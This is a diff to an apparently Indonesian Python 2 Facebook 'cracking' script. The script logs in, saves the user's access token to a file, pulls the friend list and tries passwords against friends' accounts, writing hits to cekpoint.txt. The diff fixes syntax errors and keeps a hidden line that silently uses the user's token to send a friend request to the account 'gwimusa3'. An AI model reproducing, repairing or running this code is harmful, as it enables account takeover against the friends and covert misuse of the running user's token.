@@ -56,12 +56,14 @@ def login():
                 url = 'https://api.facebook.com/restserver.php'
                 req = requests.get(url, params=data)
                 jsl = json.loads(req.text)
-                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+jsl['access_token'])
-                print h+" Berhasil Login...."
                 iq = open('token.txt', 'w')
                 iq.write(jsl['access_token'])
                 iq.close()
-                id_konco
+                print h+" Berhasil Login...."
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+jsl['access_token'])
+                
+                id_konco()
+                
             except KeyError:
                 print m+" [ Terjadi Kesalahan.. ]"
         if 'checkpoint' in url:
@@ -75,6 +77,7 @@ def id_konco():
         token = open('token.txt', 'r').read()
     except IOError:
         print m+" Tidak ada Token "
+        login()
     else:
         try:
             req = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
@@ -141,7 +144,8 @@ def cracking():
                 cekpo = open('cekpoint.txt', 'w')
                 cekpo.write(id_target + '|' + password)
                 cekpo.close()
-                cekpoint.append(' \033[31;1m [CP] \033[33;1m '+ id_target + '|' + password')                count += 1
+                cekpoint.append(' \033[31;1m [CP] \033[33;1m '+ id_target + '|' + password)                
+                count += 1
             else:
                 oradadi.append(id_target)
                
@@ -150,5 +154,6 @@ def cracking():
         sys.stdout.flush()
 def main():
     login()
+    
 if __name__=="__main__":
-main()
+    main()
